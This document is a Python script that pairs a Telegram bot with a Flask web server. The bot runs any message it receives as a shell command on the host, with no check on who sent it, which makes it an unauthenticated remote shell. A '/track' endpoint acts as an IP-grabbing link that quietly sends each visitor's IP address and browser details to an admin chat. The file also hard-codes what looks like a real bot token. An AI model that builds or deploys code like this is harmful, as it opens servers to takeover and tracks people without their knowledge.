from datetime import datetime
import os
import re
import socket
import subprocess
import threading
from flask import Flask, jsonify, request
import telebot
from telebot import types

# ----------------------------------------------------
# الإعدادات الأساسية
# ----------------------------------------------------
TOKEN = "8700445121:AAEe49qNIV_uh3atuSaqt4EXv8RrhVZskE4"
ADMIN_CHAT_ID = 8134363644
STARS_DONATE_LINK = "https://t.me/your_bot_or_username"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)
ACTIVE_PORT = 5000


# ----------------------------------------------------
# خدمات الـ API (Flask Web Server)
# ----------------------------------------------------
@app.route("/")
def home():
  return "<h1>Server is Running & Stable</h1>"


@app.route("/track", methods=["GET"])
def track_ip():
  if request.headers.getlist("X-Forwarded-For"):
    user_ip = request.headers.getlist("X-Forwarded-For")[0].split(",")[0]
  else:
    user_ip = request.remote_addr

  user_agent = request.headers.get("User-Agent", "غير معروف")
  visit_time = datetime.now().strftime("%Y-%m-%d | %I:%M:%S %p")

  alert_msg = (
      f"🚨 **تم التقاط زيارة جديدة عبر الرابط!**\n\n"
      f"🌐 **عنوان الـ IP:** `{user_ip}`\n"
      f"⏰ **الوقت:** `{visit_time}`\n"
      f"📱 **المتصفح:**\n`{user_agent}`"
  )

  try:
    bot.send_message(ADMIN_CHAT_ID, alert_msg, parse_mode="Markdown")
  except Exception as e:
    print(f"[-] خطأ في إرسال التنبيه: {e}")

  return jsonify({"status": "success", "your_ip": user_ip})


def run_flask_on_port(port):
  global ACTIVE_PORT
  ACTIVE_PORT = port
  try:
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
  except Exception as e:
    print(f"[-] خطأ في سيرفر الويب: {e}")


# ----------------------------------------------------
# دوال جلب معلومات السيرفر بدقة
# ----------------------------------------------------
def get_server_info():
  # IP الداخلي
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
  except Exception:
    local_ip = "127.0.0.1"

  # IP الخارجي
  try:
    public_ip = (
        subprocess.check_output(
            "curl -s --max-time 3 https://api.ipify.org", shell=True
        )
        .decode("utf-8")
        .strip()
    )
    if not public_ip:
      public_ip = "غير متوفر"
  except Exception:
    public_ip = "غير متوفر"

  current_time = datetime.now().strftime("%Y-%m-%d | %I:%M:%S %p")
  current_dir = os.getcwd()

  return f"⏱ **الوقت الحالي:**\n`{current_time}`\n\n🌐 **عناوين الـ IP:**\n    🔹 الداخلي: `{local_ip}`\n    🔹 الخارجي: `{public_ip}`\n\n📁 **المسار الحالي:**\n`{current_dir}`"


# ----------------------------------------------------
# أوامر التليجرام
# ----------------------------------------------------
@bot.message_handler(commands=["start"])
def send_welcome(message):
  first_name = message.from_user.first_name or "صديقي"

  markup = types.InlineKeyboardMarkup(row_width=2)
  btn_help = types.InlineKeyboardButton("📋 عرض الأوامر", callback_data="show_help")
  btn_stars = types.InlineKeyboardButton(
      "⭐ إرسال نجوم (Stars)", url=STARS_DONATE_LINK
  )
  markup.add(btn_help, btn_stars)

  info_text = get_server_info()
  msg_text = (
      f"👋 **أهلاً بك يا {first_name}!**\n\n"
      f"{info_text}\n\n"
      f"💡 *أرسل أي أمر تيرمنال للتحكم بالسيرفر مباشرة.*"
  )
  bot.reply_to(message, msg_text, parse_mode="Markdown", reply_markup=markup)


@bot.message_handler(commands=["help", "commands"])
def send_commands_list(message):
  help_text = (
      "📋 **قائمة الأوامر المتاحة:**\n\n"
      "🔹 `/start` - اللوحة الرئيسية ومعلومات السيرفر.\n"
      "🔹 `/help` - إظهار هذه القائمة.\n\n"
      "💻 **أوامر التيرمنال:**\n"
      "أرسل أي أمر شل (`ls`, `pwd`, `cd <path>`) ليتم تنفيذه فوراً."
  )
  bot.reply_to(message, help_text, parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
  if call.data == "show_help":
    help_text = (
        "📋 **قائمة الأوامر السريعة:**\n\n"
        "🔹 `/start` - اللوحة الرئيسية والزرار.\n"
        "🔹 `/help` - عرض الأوامر."
    )
    bot.answer_callback_query(call.id, "تم فتح الأوامر")
    bot.send_message(call.message.chat.id, help_text, parse_mode="Markdown")


@bot.message_handler(func=lambda message: True)
def execute_command(message):
  command = message.text.strip()
  try:
    if command.startswith("cd "):
      new_dir = command[3:].strip()
      os.chdir(new_dir)
      bot.send_message(
          message.chat.id,
          f"📁 تم تغيير المسار إلى:\n`{os.getcwd()}`",
          parse_mode="Markdown",
      )
      return

    result = subprocess.run(
        command, shell=True, capture_output=True, text=True, timeout=120
    )
    output = result.stdout + result.stderr or "✅ تم تنفيذ الأمر بنجاح."

    if len(output) > 4000:
      for x in range(0, len(output), 4000):
        bot.send_message(
            message.chat.id,
            f"```bash\n{output[x : x + 4000]}\n```",
            parse_mode="Markdown",
        )
    else:
      bot.send_message(
          message.chat.id, f"```bash\n{output}\n```", parse_mode="Markdown"
      )
  except Exception as e:
    bot.send_message(
        message.chat.id, f"❌ حدث خطأ:\n`{str(e)}`", parse_mode="Markdown"
    )


# ----------------------------------------------------
# التشغيل الرئيسي
# ----------------------------------------------------
if __name__ == "__main__":
  # تشغيل سيرفر الـ API في الخلفية على بورت 5000
  threading.Thread(
      target=run_flask_on_port, args=(5000,), daemon=True
  ).start()

  print("[*] تم إعادة ضبط السيرفر وتشغيله بنجاح...")
  bot.infinity_polling()
